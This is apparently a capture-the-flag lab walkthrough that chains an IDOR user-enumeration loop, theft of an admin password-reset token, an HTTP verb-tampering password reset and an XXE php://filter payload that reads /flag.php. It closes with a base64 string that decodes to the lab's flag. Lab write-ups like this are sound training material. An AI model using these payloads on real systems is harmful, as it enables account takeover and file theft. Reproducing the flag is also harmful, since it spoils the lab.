# Attack Chain: IDOR → Account Takeover → XXE

**Objective:** Escalate privileges to Admin and read the restricted `/flag.php` file.

* * *

#### **Phase One: Recon & IDOR (The Entry)**

_Trace the API signals to find hidden users._

1.  **Identify the Signal:** Inspect web traffic (F12) during normal usage. Note that user data is fetched via an API call:
    
    *   `GET /api.php/user/74`.
2.  **Test the Interlock (IDOR Check):** Change the `uid` manually (e.g., to 75). If you see another user's data, the interlock is missing.
3.  **Fuzz for Admin:** Since we are blind to the Admin's ID, write a loop to map the entire database.
    
    ```sh
    # Scan UIDs 1-100 and look for "admin"
    for uid in {1..100}; do
        curl -s "http://TARGET/api.php/user/$uid" | grep -i "admin"
    done
    ```
    
    *   **Result:** Admin found at **UID 52**.

* * *

#### **Phase Two: Account Takeover (The Bypass)**

_Logic: We have the ID (52), now we need the keys (Token + Password). Connection blocked via POST? Try the side door (GET)._

1.  **Steal the Reset Token:**
    
    *   The "Change Password" feature triggers a request to `/api/token/74`.
    *   **Exploit:** Change ID to 52 -> `GET /api.php/token/52`.
    *   **Loot:** Admin Token (`e51a85fa...`).
2.  **Attempt Reset (The Block):**
    
    *   Sending a standard `POST` request to `reset.php` with the stolen token returns: `Access Denied`.
    *   _Diagnosis:_ The server likely checks if the session cookie matches the User ID during a POST request.
3.  **The Fix (HTTP Verb Tampering):**
    
    *   The developer secured the `POST` handler but likely forgot to secure the `GET` handler.
    *   **Action:** Convert the request from POST to GET and send parameters in the URL.
    *   **Payload:**
        
        ```html
        GET /reset.php?uid=52&token=[TOKEN]&password=NewPassword123 HTTP/1.1
        Host: target.com
        ```
    *   **Result:** Password reset successful. Login as `a.corrales` (Admin).

* * *

#### **Phase Three: Execution (XXE Injection)**

_Use Admin access to find a feature that parses XML, then force it to read a local PHP file._

1.  **Identify the Surface:**
    
    *   Login as Admin. Locate the "Add Event" button (privileged feature).
    *   Inspect the request: It sends **XML data** to `addEvent.php`.
2.  **Inject the Payload:**
    
    *   We cannot read `/flag.php` directly because it contains PHP code (the parser will try to execute it).
    *   **Bypass:** Use the `php://filter` wrapper to encode the file as Base64.
    *   **Payload:**
        
        ```xml
        <!DOCTYPE replace [
            <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
        ]>
        <root>
            <name>&xxe;</name>
            <details>pwned</details>
            <date>2021-09-22</date>
        </root>
        ```
        
        .
3.  **Fire:** Send the request via Burp Repeater.

* * *

#### **Phase Four: The Loot**

1.  **Extract:** The server response will contain a long Base64 string inside the `<name>` tag.
2.  **Decode:**
    
    ```sh
    echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
    ```